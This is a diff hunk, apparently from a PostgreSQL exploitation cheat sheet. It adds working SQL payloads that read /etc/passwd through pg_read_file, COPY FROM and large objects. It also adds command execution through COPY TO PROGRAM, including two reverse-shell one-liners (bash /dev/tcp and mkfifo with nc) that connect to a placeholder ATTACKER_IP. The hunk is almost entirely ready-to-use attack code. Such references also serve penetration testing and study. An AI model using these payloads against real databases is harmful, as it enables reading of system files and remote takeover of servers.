@@ -494,13 +494,31 @@ SELECT tablename FROM pg_tables WHERE schemaname='public'
 ### File Read
 
 ```sql
+-- Method 1: pg_read_file (superuser only)
 SELECT pg_read_file('/etc/passwd')
+
+-- Method 2: COPY FROM (requires table creation)
+CREATE TABLE read_files(output text);
+COPY read_files FROM '/etc/passwd';
+SELECT * FROM read_files;
+
+-- Method 3: Large Object
+SELECT lo_import('/etc/passwd');
+SELECT * FROM pg_largeobject;
 ```
 
 ### Command Execution
 
 ```sql
+-- Method 1: COPY TO PROGRAM
 COPY (SELECT '') TO PROGRAM 'id';
+
+-- Method 2: Reverse shell
+COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"';
+
+-- Method 3: COPY FROM PROGRAM (alternative)
+CREATE TABLE shell(output text);
+COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f';
 ```
 
 ---
